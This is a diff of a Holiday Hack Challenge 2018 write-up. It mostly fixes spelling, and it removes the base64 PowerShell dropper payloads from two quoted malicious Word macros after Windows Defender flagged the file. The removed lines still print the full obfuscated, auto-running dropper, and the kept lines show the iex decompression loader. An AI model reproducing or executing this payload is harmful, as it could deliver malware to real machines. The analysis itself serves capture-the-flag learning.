@@ -294,7 +294,7 @@ $ curl -d "status=on" -X POST http://localhost:8080/index.php --http2-prior-know
 **The answer is `19880715`.**
 
 ## scan-o-matic
-To get into the room we need to upload a QRcode with the payload to do SQLi.
+To get into the room we need to upload a QR code with the payload to do SQLi.
 
 The request looks like:
 
@@ -926,6 +926,11 @@ Create Snort rules for both sides of traffic as seen above:
 We have already seen the domain in Wireshark, it's `erohetfanu.com`.
 
 ### Dropper Analysis
+**Update 2022-02-07**: Windows Defender keeps deleting this file because it
+detects a trojan. This is likely because this dropper code. I am tired of
+reverting this. So I am gonna remove parts of this section to figure out which
+part is the culprit. The cleaned up PowerShell script is on GitHub.
+
 There's a zip file with a `docm` in it. Password is `elves`.
 
 * https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip
@@ -974,7 +979,7 @@ in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 Private Sub Document_Open()
 Dim cmd As String
-cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
+cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('[removed-because-of-windows-defender]'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
 Shell cmd
 End Sub
 
@@ -984,14 +989,14 @@ in file: word/vbaProject.bin - OLE stream: u'VBA/NewMacros'
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 Sub AutoOpen()
 Dim cmd As String
-cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
+cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('[removed-because-of-windows-defender]'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
 Shell cmd
 End Sub
 ```
 
-Seems like the Powershell payload is base64 encoded and then compressed.
+Seems like the PowerShell payload is base64 encoded and then compressed.
 
-Cyberchef to the rescue with these filters:
+CyberChef to the rescue with these filters:
 
 ```
 From_Base64('A-Za-z0-9+/=',true)
